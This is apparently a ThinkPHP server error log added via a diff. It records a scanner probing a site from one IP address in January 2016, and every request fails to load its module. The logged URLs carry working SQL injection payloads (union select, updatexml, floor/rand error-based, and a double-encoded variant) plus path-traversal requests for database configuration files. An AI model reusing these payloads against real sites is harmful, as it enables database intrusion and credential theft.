@@ -1,0 +1,78 @@
+[ 2016-01-08T07:52:11+08:00 ] 121.42.0.16 /upload/index.php?m=tag&a=view&name=1+union+select/**/+m_name,md5(233333)+from+information_schema.tables%23
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000353s ]
+ERR: 无法加载模块:Tag
+
+[ 2016-01-08T07:52:18+08:00 ] 121.42.0.16 /index.php?m=wap&c=index&a=comment_list&commentid=content_12%2527%20or%20updatexml(1,concat(0x7e,(version())),0)%23-84-1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000325s ]
+ERR: 无法加载模块:Wap
+
+[ 2016-01-08T07:52:50+08:00 ] 121.42.0.16 /index.php?m=tg/admin&s=delivery_address
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000331s ]
+ERR: 无法加载模块:Tg/admin
+
+[ 2016-01-08T07:52:52+08:00 ] 121.42.0.16 /index.php?m=download/admin&s=order_update
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000348s ]
+ERR: 无法加载模块:Download/admin
+
+[ 2016-01-08T07:52:54+08:00 ] 121.42.0.16 /index.php?m=buy/admin&s=add_cat
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000323s ]
+ERR: 无法加载模块:Buy/admin
+
+[ 2016-01-08T07:53:13+08:00 ] 121.42.0.16 /index.php?m=poster&c=index&a=poster_click&id=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000346s ]
+ERR: 无法加载模块:Poster
+
+[ 2016-01-08T07:53:54+08:00 ] 121.42.0.16 /index.php?m=vote&c=index&a=post&subjectid=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000329s ]
+ERR: 无法加载模块:Vote
+
+[ 2016-01-08T07:58:59+08:00 ] 121.42.0.16 /index.php?m=message
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000332s ]
+ERR: 无法加载模块:Message
+
+[ 2016-01-08T07:59:16+08:00 ] 121.42.0.16 /user/reg/regajax.asp?action=getcityoption&province=%2527%2520%2575%256e%2569%256f%256e%2520%2553%2565%256c%2565%2563%2574%2520%2574%256f%2570%2520%2531%2530%2520%2541%2564%256d%2569%256e%2549%2544%252c%2549%256e%2574%2528%2536%2535%2535%2533%2536%2536%2535%2535%2533%252d%2531%2530%2532%2534%2531%2530%2532%2534%2529%2520%2546%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000317s ]
+ERR: 无法加载模块:User
+
+[ 2016-01-08T08:08:03+08:00 ] 121.42.0.16 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000311s ]
+ERR: 无法加载模块:Goods
+
+[ 2016-01-08T08:09:00+08:00 ] 121.42.0.16 /phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000335s ]
+ERR: 无法加载模块:Phpsso
+
+[ 2016-01-08T08:09:12+08:00 ] 121.42.0.16 /User/UserZone/School/Download.aspx?f=..%5C..%5C..%5CConfig%5CConnectionStrings.config
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000330s ]
+ERR: 无法加载模块:User
+
+[ 2016-01-08T08:09:28+08:00 ] 121.42.0.16 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000338s ]
+ERR: 无法加载模块:Search
+
